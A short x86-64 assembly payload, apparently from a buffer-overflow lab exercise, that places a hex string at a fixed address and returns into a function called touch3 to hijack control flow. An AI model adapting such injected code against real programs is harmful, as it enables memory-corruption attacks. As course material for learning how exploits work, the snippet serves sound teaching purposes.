movabs  $0x6166373939623935, %rax           # push string bytes to register
movq    $0x5561dcb0, %rdi                   # set rdi to &string
movq    %rax, (%rdi)                        # move string bytes to stack position
movl    $0, 8(%rdi)                         # NUL terminate string (movl will clear upper 4 bytes)
push    $0x4018fa                           # push touch3 return address
ret                                         # return
